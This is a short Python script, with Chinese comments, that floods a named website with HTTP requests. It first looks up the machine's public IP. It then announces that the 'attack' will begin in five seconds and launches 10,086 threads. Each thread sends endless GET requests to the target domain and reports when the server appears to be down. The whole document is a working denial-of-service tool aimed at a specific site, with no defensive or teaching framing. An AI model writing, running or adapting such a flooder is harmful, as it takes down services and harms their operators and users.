import requests
import threading
import socket
import time
# 用第三方API获取本机公网IP地址
def get_public_ip():
    try:
        response = requests.get("http://ipv4.ip.mir6.com")
        public_ip = response.text.strip()
        return public_ip
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return None

# 调用函数并打印IP
public_ip = get_public_ip()
if public_ip:
    print(f"本机公网IP地址: {public_ip}，5秒后自动开始攻击")
    print(f"====================================================================")
else:
    print("无法获取公网IP地址")

time.sleep(5)
# 目标URL
target_url = "https://guoyuangzs.dpdns.org"
# 发送请求的函数
def send_request():
    while True:
        try:
            response = requests.get(target_url)
            print(f"请求成功发送到 {target_url}, 状态码: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"请求错误——服务器可能已宕机，错误原因： {e}")
            print(f"====================================================================")

# 创建多个线程进行攻击
def start_attack(thread_count):
    threads = []
    for i in range(thread_count):
        thread = threading.Thread(target=send_request)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    # 设置线程数量
    thread_count = 10086
    start_attack(thread_count)
